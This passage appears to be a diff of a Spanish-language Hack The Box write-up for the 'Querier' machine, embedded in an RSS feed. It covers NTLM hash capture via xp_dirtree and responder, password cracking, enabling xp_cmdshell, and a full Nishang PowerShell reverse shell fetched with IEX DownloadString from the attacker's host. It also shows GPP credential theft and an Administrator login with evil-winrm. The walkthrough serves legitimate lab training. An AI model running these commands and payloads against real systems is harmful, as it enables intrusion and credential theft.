-|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
-|          |                    |used to obfuscate strings (option --decode to|
-|          |                    |see all)                                     |
-+----------+--------------------+---------------------------------------------+
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a proceder a verificar si las credenciales son validas para ello usaremos &lt;code&gt;crackmapexec&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
-SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
-SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como tenemos credenciales validas, podemos tratar de conectarnos al servicio &lt;code&gt;mssql&lt;/code&gt; que vimos antes, para ello usaremos la herramienta &lt;code&gt;mssqlclient.py&lt;/code&gt; que viene incluida en la suite de &lt;code&gt;impacket&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/fortra/impacket&quot;&gt;https://github.com/fortra/impacket&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Especificamos tal como nos indica el uso de la herramienta el &lt;code&gt;dominio&lt;/code&gt;, &lt;code&gt;usuario&lt;/code&gt;, &lt;code&gt;contraseña&lt;/code&gt; y adicionamos el parametro &lt;code&gt;-windows-auth&lt;/code&gt; el cual permite utilizar o no la autenticación de Windows &lt;code&gt;(por defecto False)&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-Password:
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
-[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
-[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
-[!] Press help for extra shell commands SQL&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez conectados al servicio lo que intentaremos hacer es usar &lt;code&gt;xp_cmdshell&lt;/code&gt; para tratar de ejecutar comandos, pero vemos que el usuario &lt;code&gt;reporting&lt;/code&gt; no cuenta con los privilegios suficientes:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SQL&amp;gt; xp_cmdshell 'whoami'
-[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'whoami'.
-SQL&amp;gt; sp_configure 'show_advance', 1
-[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
-SQL&amp;gt; sp_configure 'xp_cmdshell', 1
-[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
-SQL&amp;gt; sp_configure 'show_advance', 1
-[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
-SQL&amp;gt; reconfigure
-[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
-SQL&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Probaremos a tratar de lanzar una conexion con el comando &lt;code&gt;xp_dirtree&lt;/code&gt; para tratar de realizar una conexion a un recurso compartido que alojare en mi maquina y mientras el servidor trata de auntenticarse a mi maquina, con &lt;code&gt;responder&lt;/code&gt; intentare capturar el hash ` Net-NTLMv2`.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
-SQL&amp;gt; xp_dirtree &quot;\\10.10.16.4\test&quot;
-subdirectory                                                                                                                                                                                                                                                            depth   
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   
-
-SQL&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ responder -I tun0
-                                         __
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|
-[+] HTTP Options:
-           NBT-NS, LLMNR &amp;amp; MDNS Responder 3.0.6.0
-    Serving EXE                [OFF]
-  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
-  To kill this script hit CTRL-C
-
-[+] Poisoning Options:
-[+] Poisoners:
-    LLMNR                      [ON]
-    NBT-NS                     [ON]
-    DNS/MDNS                   [ON]
-    Fingerprint hosts          [OFF]
-[+] Servers:
-    HTTP server                [ON]
-    HTTPS server               [ON]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [ON]
-    SQL server                 [ON]
-    FTP server                 [ON]
-    IMAP server                [ON]
-    POP3 server                [ON]
-    SMTP server                [ON]
-    DNS server                 [ON]
-    LDAP server                [ON]
-    RDP server                 [ON]
-    DCE-RPC server             [ON]
-    WinRM server               [ON]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Fingerprint hosts          [OFF]
-
-[+] Generic Options:
-    Responder NIC              [tun0]
-    Responder IP               [10.10.16.4]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP']
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-LBGCELK616Y]
-    Responder Domain Name      [68T9.LOCAL]
-    Responder DCE-RPC Port     [49780]
-
-[+] Listening for events...
-[SMB] NTLMv2-SSP Client   : 10.10.10.125
-[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
-[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:ba540bb74f74294f:4BD001461E512C70BDF3EEB128106707:0101000000000000808ED3322E5FD901A773108D6C1BE5000000000002000800360038005400390001001E00570049004E002D004C0042004700430045004C004B00360031003600590004003400570049004E002D004C0042004700430045004C004B0036003100360059002E0036003800540039002E004C004F00430041004C000300140036003800540039002E004C004F00430041004C000500140036003800540039002E004C004F00430041004C0007000800808ED3322E5FD90106000400020000000800300030000000000000000000000000300000E9065E16CEFD1E276185F5DFA30A232F59D4C33E5CD80DC5D131A1B67AEAE4F60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003400000000000000000000000000
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Obtuvimos un hash correspondiente al usario &lt;code&gt;mssql-svc&lt;/code&gt; el cual trataremos de crackearlo con &lt;code&gt;john&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
-Using default input encoding: UTF-8
-Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-corporate568     (mssql-svc)
-1g 0:00:00:37 DONE (2023-03-25 15:30) 0.02700g/s 241965p/s 241965c/s 241965C/s correforenz..cornamuckla
-Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;John&lt;/code&gt; logra obtener la contraseña en texto claro y ahora contamos con nuevas credenciales que podemos probar:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;usuario: mssql-svc&lt;/li&gt;
-  &lt;li&gt;password: corporate568&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Volvemos a validar la contraseña con &lt;code&gt;crackmapexec&lt;/code&gt;y efectivamente son validas:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
-SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
-SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\mssql-svc:corporate568
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya que ahora disponemos de credenciales del usuario &lt;code&gt;mssql-svc&lt;/code&gt; quiero pensar que me puedo conectar con &lt;code&gt;mssqlclient.py&lt;/code&gt; y que este contara con mayores privilegios y esta vez si que podremos ejecutar comandos:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Password:
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
-[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
-[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
-[!] Press help for extra shell commands
-SQL&amp;gt; sp_configure 'xp_cmdshell', 1
-[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
-SQL&amp;gt; sp_configure 'show_advanced', 1
-[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL&amp;gt; reconfigure
-SQL&amp;gt; sp_configure 'xp_cmdshell', 1
-[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL&amp;gt; reconfigure
-SQL&amp;gt; xp_cmdshell &quot;whoami&quot;
-output                                                                             
-
---------------------------------------------------------------------------------   
-
-querier\mssql-svc                                                                  
-
-NULL                                                                               
-
-SQL&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esta vez si conseguimos ejecutar comandos, lo siguiente sera ganar acceso con una consola en powershell y movernos mas comodamente desde nuestra maquina victima, y para ello usaremos `
-Invoke-PowerShellTcp.ps1 ` del repositorio de &lt;code&gt;Nishang&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Editaremos la linea final del script y al ejecutarlo con &lt;code&gt;Iex&lt;/code&gt; nos interprete el script incluida la linea final de ese modo matamos dos pajaros de un tiro:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function Invoke-PowerShellTcp 
-{ 
-&amp;lt;#
-.SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
-
-.DESCRIPTION
-This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
-Also, a standard netcat can connect to this script Bind to a specific port.
-
-The script is derived from Powerfun written by Ben Turner &amp;amp; Dave Hardy
-
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-
-.PARAMETER Port
-The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
-
-.EXAMPLE
-PS &amp;gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-
-.EXAMPLE
-PS &amp;gt; Invoke-PowerShellTcp -Bind -Port 4444
-
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
-
-.EXAMPLE
-PS &amp;gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-
-.LINK
-http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-https://github.com/samratashok/nishang
-#&amp;gt;      
-    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
-        [Int]
-        $Port,
-
-        [Parameter(ParameterSetName=&quot;reverse&quot;)]
-        [Switch]
-        $Reverse,
-
-        [Parameter(ParameterSetName=&quot;bind&quot;)]
-        [Switch]
-        $Bind
-
-    )
-
-    
-    try 
-    {
-        #Connect back if the reverse switch is used.
-        if ($Reverse)
-        {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        }
-
-        #Bind to the provided port if Bind switch is used.
-        if ($Bind)
-        {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
-
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
-
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        #Show an interactive PowerShell prompt
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                #Execute the command on the target.
-                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
-            }
-            catch
-            {
-                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
-
-            #Return the results
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    }
-    catch
-    {
-        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
-        Write-Error $_
-    }
-}
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 443
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Seguidamente procedemos a montarnos un servidor local con python donde alojaremos el script &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- Invoke-PowerShellTcp.ps1   Report.xlsm
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos la instruccion con &lt;code&gt;xp_cmdshell&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SQL&amp;gt; xp_cmdshell &quot;powershell IEX(New-Object Net.WebClient).downloadString(\&quot;http://10.10.16.4/Invoke-PowerShellTcp.ps1\&quot;)&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en puerto &lt;code&gt;443&lt;/code&gt; y ganamos acceso al sistema:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.125.
-Ncat: Connection from 10.10.10.125:49681.
-Windows PowerShell running as user mssql-svc on QUERIER
-Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
-PS C:\Windows\system32&amp;gt;whoami
-querier\mssql-svc
-PS C:\Windows\system32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;AHora vamos al directorio personal del usuario y visializamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt;cd C:\Users\
-PS C:\Users&amp;gt; dir
-
-
-    Directory: C:\Users
-
-
-Mode                LastWriteTime         Length Name                                                                  
-----                -------------         ------ ----                                                                  
-d-----        1/28/2019  10:17 PM                Administrator                                                         
-d-----        1/28/2019  11:42 PM                mssql-svc                                                             
-d-r---        1/28/2019  10:17 PM                Public                                                                
-
-
-PS C:\Users&amp;gt; cd mssql-svc
-PS C:\Users\mssql-svc&amp;gt; cd Desktop
-PS C:\Users\mssql-svc\Desktop&amp;gt; type user.txt
-089b86d375c2a51f4aae02b9a984a9ee
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Una vez dentro ejecutamos el comando &lt;code&gt;whoami /priv&lt;/code&gt; y vemos que tenemos activado el &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                               State   
-============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podriamos utilizar &lt;code&gt;JuicyPotato&lt;/code&gt;, pero esta vez vamos a usar &lt;code&gt;PowerUp.ps1&lt;/code&gt; de &lt;code&gt;powersploit&lt;/code&gt; para enumerar el sistema.&lt;/p&gt;
-
-&lt;p&gt;Nos volvemos a compartir un servidor web con &lt;code&gt;python3&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- Invoke-PowerShellTcp.ps1   PowerUp.ps1   Report.xlsm
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y ejecutamos con &lt;code&gt;Iex&lt;/code&gt; la instraccion para ejecutar e interpretar el script en la maquina victima y hacer un reconocimiento total:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez ejecutado esperamos un poco y el sistema nos enumera unas credenciales Administrativas del archivo &lt;code&gt;Groups.xml&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')
-
-
-Privilege   : SeImpersonatePrivilege
-Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
-TokenHandle : 2468
-ProcessId   : 3744
-Name        : 3744
-Check       : Process Token Privileges
-
-ServiceName   : UsoSvc
-Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
-CanRestart    : True
-Name          : UsoSvc
-Check         : Modifiable Services
-
-ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-IdentityReference : QUERIER\mssql-svc
-Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
-%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
-
-UnattendPath : C:\Windows\Panther\Unattend.xml
-Name         : C:\Windows\Panther\Unattend.xml
-Check        : Unattended Install Files
-
-Changed   : {2019-01-28 23:12:48}
-UserNames : {Administrator}
-NewName   : [BLANK]
-Passwords : {MyUnclesAreMarioAndLuigi!!1!}
-File      : C:\ProgramData\Microsoft\Group 
-            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
-Check     : Cached GPP Files
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a proceder a validar si las credenciales corresponden al usuario &lt;code&gt;Administrador&lt;/code&gt; y efectivamente asi es:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
-SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
-SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora podemos hacer uso del puerto &lt;code&gt;5985&lt;/code&gt; servicio de administracion remota de windows con la ayuda de &lt;code&gt;evil-winrm&lt;/code&gt; nos dirigimos al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y podemos visualiar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10.10.10.125
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd C:\Users\Administrator\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
-6d6c9abc4b5ecfaf4587047710b1bbb3
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Querier</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Querier</guid>
-        
-        <category>cached gpp</category>
-        
-        <category>shared files</category>
-        
-        <category>abussingmysql</category>
-        
-        <category>macroinspection</category>
-        
-        <category>Active Directory</category>
-        
-        
-        <category>hackthebox</category>
         
       </item>
     
